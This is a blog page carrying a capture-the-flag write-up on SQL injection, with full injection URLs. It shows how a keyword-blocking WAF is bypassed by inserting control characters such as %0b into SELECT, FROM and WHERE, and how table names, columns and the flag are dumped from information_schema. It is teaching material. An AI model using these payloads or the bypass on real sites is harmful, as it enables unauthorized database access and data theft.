<!DOCTYPE HTML><html><head><title>Hackallthethings.xyz</title><meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" /><link rel="stylesheet" href="/assets/css/main.css" /><link href="/assets/css/syntax.css" rel="stylesheet" /></head><body class="is-preload"><div id="header"><div class="top"><div id="logo"> <span class="image avatar48"><img src="/assets/images/avatar.jpg" alt="" /></span><h1 id="title">Hland</h1><p></p></div><nav id="nav"><ul><li><a href="/" id="top-link"><span class="icon fa-user">whoami</span></a></li><li><a href="/library"><span class="icon fa-book">Library</span></a></li><li><a href="/weblog"><span class="icon fa-rss">Weblog</span></a></li></ul></nav></div><div class="bottom"><ul class="icons"><li><a href="https://twitter.com/vladthegad" target="_blank" _rel="noreferrer noopen" class="icon fa-twitter"><span class="label">Twitter</span></a></li><li><a href="https://lmgtfy.com/?q=Privacy+is+not+dead" target="_blank" _rel="noreferrer noopen" class="icon fa-facebook"><span class="label">Facebook</span></a></li><li><a href="https://hackerone.com/hland" target="_blank" _rel="noreferrer noopen" class="icon"><span class="label">HackerOne</span></a></li></ul></div></div><section id="weblog" class="two"><div class="container"><header><h2>Simplesqlin</h2><p>Writtten by Hland on March 01, 2017</p></header><section class="post"><p>The server runs <code class="highlighter-rouge">openresty/1.11.2.2</code> according to the response headers.</p><p>Injection point is here: <code class="highlighter-rouge">http://202.120.7.203/index.php?id=1*</code></p><p>We can add or subtract or multiply numbers..</p><p><code class="highlighter-rouge">http://202.120.7.203/index.php?id=2-1</code> <code class="highlighter-rouge">http://202.120.7.203/index.php?id=2%2b1</code> <code class="highlighter-rouge">http://202.120.7.203/index.php?id=2*1</code></p><p>By doing <code class="highlighter-rouge">order by</code> we find the column number, which is 3. <code class="highlighter-rouge">order by 4</code> gives a 500 error:</p><p><code class="highlighter-rouge">http://202.120.7.203/index.php?id=1%20order%20by%203--+</code></p><p>Anything else so far results in 500 errors. There is a WAF blocking certain keywords. List of blocked keywords:</p><ul><li><code class="highlighter-rouge">SELECT</code></li><li><code class="highlighter-rouge">FROM</code></li><li><code class="highlighter-rouge">WHERE</code></li><li><code class="highlighter-rouge">SLEEP</code></li></ul><p>We can bypass the WAF by inserting a control character inside the keywords. Here we used <code class="highlighter-rouge">%0b</code> which is vertical tabulation.</p><p><code class="highlighter-rouge">http://202.120.7.203/index.php?id=2 uni%0bon+se%0blect 1,"a",3 order by 1--+</code></p><p>Other control characters that work in this case are:</p><ul><li><code class="highlighter-rouge">%0c</code></li><li><code class="highlighter-rouge">%0E</code></li><li><code class="highlighter-rouge">%0F</code></li><li><code class="highlighter-rouge">%10 - %1f</code></li></ul><p>So the WAF is relatively easily bypassed.</p><p>Now we need to find the table in which the flag is stored. Because I suck at remembering Mysql special tables and such I used a resource like this:</p><p><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">MySQL Injection Cheat Sheet</a></p><p>Then we do a query like this:</p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://202.120.7.203/index.php?id=2 uni%0bon+se%1flect table_schema,table_name,1 FR%0bOM information_schema.tables WHE%0bRE table_schema != 'mysql' AND table_schema != 'information_schema' order by 3--+
</code></pre></div></div><p>To find that there is a table called <code class="highlighter-rouge">flag</code>, duh.</p><p>And we can also get the column name in a similar fashion:</p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://202.120.7.203/index.php?id=2 uni%0bon+se%1flect table_schema,table_name,column_name FR%0bOM information_schema.columns WHE%0bRE table_schema != 'mysql' AND table_schema != 'information_schema' order by 3 LIMIT 1 OFFSET 1--+
</code></pre></div></div><p>And then finally we can get the flag by doing this query:</p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://202.120.7.203/index.php?id=2 uni%0bon+se%1flect flag,1,2 FR%0bOM flag order by 3--+
</code></pre></div></div><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flag{W4f_bY_paSS_f0R_CI}
</code></pre></div></div></section></div></section><script src="/assets/js/jquery.min.js"></script> <script src="/assets/js/jquery.scrolly.min.js"></script> <script src="/assets/js/jquery.scrollex.min.js"></script> <script src="/assets/js/browser.min.js"></script> <script src="/assets/js/breakpoints.min.js"></script> <script src="/assets/js/util.js"></script> <script src="/assets/js/main.js"></script></body></html>
